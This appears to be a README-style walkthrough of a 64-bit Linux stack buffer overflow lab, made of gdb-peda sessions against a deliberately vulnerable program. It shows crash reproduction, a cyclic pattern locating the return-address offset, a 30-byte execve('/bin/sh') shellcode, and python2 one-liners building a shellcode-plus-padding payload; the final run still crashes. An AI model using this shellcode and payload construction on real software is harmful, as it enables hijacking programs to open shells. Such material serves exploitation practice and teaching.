# buffer-overflow-linux-64-bit
buffer overflow linux 64 bit

gdb-peda$ file app
Reading symbols from app...

(No debugging symbols found in app)

gdb-peda$ 

gdb-peda$ run

Starting program: /home/kali/Desktop/Buffer_linux/app 
Oops, I'm leaking! 0x7fffffffe0c0
Pwn me ¯\_(ツ)_/¯ 
> 
gdb-peda$ disassemble main

______________________________________
┌─[kali@kali]─[~/Desktop/Buffer_linux]
└──╼ $python -c 'print "A"*300' > f
______________________________________
gdb-peda$ run < f

Starting program: /home/kali/Desktop/Buffer_linux/app < f

Oops, I'm leaking! 0x7fffffffe0c0

Pwn me ¯\_(ツ)_/¯ 

> 

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]

RAX: 0x0 

RBX: 0x0 

RCX: 0x7ffff7edef4e (<__GI___libc_read+14>:     cmp    rax,0xfffffffffffff000)

RDX: 0x0 

RSI: 0x7ffff7faea03 --> 0xfb1680000000000a

RDI: 0x7ffff7fb1680 --> 0x0 

RBP: 0x4141414141414141 ('AAAAAAAA')

RSP: 0x7fffffffe108 ('A' <repeats 200 times>...)

RIP: 0x40088e (<main+95>:       ret)

R8 : 0x7fffffffe0c0 ('A' <repeats 200 times>...)

R9 : 0x0 

R10: 0xfffffffffffff24a 

R11: 0x246 

R12: 0x4006a0 (<_start>:        xor    ebp,ebp)

R13: 0x0 

R14: 0x0 

R15: 0x0

EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)

[-------------------------------------code-------------------------------------]

   0x400883 <main+84>:  call   0x400650 <fgets@plt>
   
   0x400888 <main+89>:  mov    eax,0x0
   
   0x40088d <main+94>:  leave  
   
=> 0x40088e <main+95>:  ret    

   0x40088f:    nop
   
  
   0x400890 <__libc_csu_init>:  push   r15
   
   0x400892 <__libc_csu_init+2>:        push   r14
   
   0x400894 <__libc_csu_init+4>:        mov    r15d,edi

gdb-peda$run < pattern 

Starting program: /home/kali/Desktop/Buffer_linux/app < pattern

Oops, I'm leaking! 0x7fffffffe0c0

Pwn me ¯\_(ツ)_/¯ 

> 
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]

RAX: 0x0 

RBX: 0x0 

RCX: 0xfbad20ab 

RDX: 0x0 

RSI: 0x7ffff7faea03 --> 0xfb16800000000025 

RDI: 0x7ffff7fb1680 --> 0x0 

RBP: 0x4141334141644141 ('AAdAA3AA')

RSP: 0x7fffffffe108 

("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A"...)

RIP: 0x40088e (<main+95>:       ret)

R8 : 0x7fffffffe0c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)

gdb-peda$ pattern_search 

Registers contain pattern buffer:

RBP+0 found at offset: 64

Registers point to pattern buffer:

[RSP] --> offset 72 - size ~203

[R8] --> offset 0 - size ~203

Pattern buffer found at:

0x00007fffffffe0c0 : offset    0 - size  300 ($sp + -0x48 [-18 dwords])

# Linux/x86_64 execve("/bin/sh"); 30 bytes shellcode 

["\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"](http://shell-storm.org/shellcode/files/shellcode-603.php)

┌─[kali@kali]─[~/Desktop/Buffer_linux]
└──╼ $python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+b"A"*42+"BBBBBB"' > ff

┌─[kali@kali]─[~/Desktop/Buffer_linux]
└──╼ $python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+b"A"*42+"BBBBBB"' > ff

RSI: 0x7ffff7faea03 --> 0xfb1680000000000a 

RDI: 0x7ffff7fb1680 --> 0x0 

RBP: 0x4242424141414141 ('AAAAABBB')

RSP: 0x7fffffffe110 --> 0x7fffffffe1f8 --> 0x7fffffffe4df ("/home/kali/Desktop/Buffer_linux/app")

RIP: 0x7f000a424242 

R8 : 0x7fffffffe0c0 --> 0x91969dd1bb48c031

Stopped reason: SIGSEGV

0x00007f000a424242 in ?? ()



